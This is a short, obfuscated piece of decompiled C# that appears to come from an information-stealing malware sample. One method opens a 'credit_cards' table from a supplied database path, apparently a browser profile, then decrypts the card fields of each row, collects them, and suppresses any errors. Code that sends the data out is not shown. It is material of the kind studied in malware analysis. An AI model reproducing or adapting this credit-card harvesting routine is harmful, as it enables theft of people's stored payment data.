using System.Collections.Generic;

internal sealed class Class81
{
	public static List<Struct1> smethod_0(string string_0)
	{
		List<Struct1> list = new List<Struct1>();
		try
		{
			Class54 @class = Class55.smethod_0(string_0, "credit_cards");
			if (@class == null)
			{
				return list;
			}
			for (int i = 0; i < @class.method_1(); i++)
			{
				Struct1 item = default(Struct1);
				item.String_0 = Class87.smethod_2(Class87.smethod_4(string_0, @class.method_0(i, 4)));
				item.String_1 = Class87.smethod_2(Class87.smethod_4(string_0, @class.method_0(i, 3)));
				item.String_2 = Class87.smethod_2(Class87.smethod_4(string_0, @class.method_0(i, 2)));
				item.String_3 = Class87.smethod_2(Class87.smethod_4(string_0, @class.method_0(i, 1)));
				Class36.int_1++;
				list.Add(item);
			}
			return list;
		}
		catch
		{
			return list;
		}
	}
}
